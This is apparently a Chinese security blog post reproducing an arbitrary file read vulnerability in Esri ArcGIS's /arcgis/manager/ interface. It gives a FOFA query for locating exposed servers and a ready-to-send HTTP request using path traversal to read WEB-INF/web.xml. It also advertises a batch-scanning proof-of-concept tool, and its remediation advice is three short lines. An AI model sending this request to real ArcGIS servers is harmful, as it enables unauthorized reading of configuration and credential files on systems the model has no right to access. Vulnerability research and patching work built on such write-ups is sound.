#  【漏洞复现】ArcGIS地理空间平台manager任意文件读取漏洞   
原创 清风  白帽攻防   2024-11-26 01:07  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
ArcGIS是由美国Esri公司开发的一款地理信息系统（GIS）软件，融合了数据库技术、软件工程、人工智能、网络技术以及云计算等先进的IT技术，旨在为用户提供一整套全面的、开放的企业级GIS解决方案。它包括一个具有图形用户界面的Windows桌面应用程序，可以支持从基础到复杂的各种GIS任务，如地图制作、空间分析、数据编辑与管理、可视化以及空间数据处理等。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0fqqRV0d4YwbpUIeQOqXeQYSeQgP7wQCuqM8ywLDWfsibPVG8gvS2AKrenIvpqeFHXPpyiaMEJibcic6Q/640?wx_fmt=png&from=appmsg "")  
漏洞描述  
  
在 ArcGIS 地理信息系统的/arcgis/manager/接口处存在任意文件读取漏洞，未授权的攻击者可以利用该漏洞获取系统中的关键文件，例如数据库配置文件和系统配置文件等。  
fofa语法```
app="esri-ArcGIS"
```  
漏洞复现```
GET /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0fqqRV0d4YwbpUIeQOqXeQYVlCmJY0haTcA5ZSNIjeTqASsgVRm0rqZQZARENSSawYSNWAxCH9LbQ/640?wx_fmt=png&from=appmsg "")  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0fqqRV0d4YwbpUIeQOqXeQYzKj3G1lcKK6nB1ZmxqibLmVKw2Uzl43vXLEiczUmTzfEfaibqGhsMzK9A/640?wx_fmt=png&from=appmsg "")  
修复建议  
  
  
  
  
1、限定文件的访问范围  
  
2、验证输入路径  
  
3、标准化文件路径  
  
  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
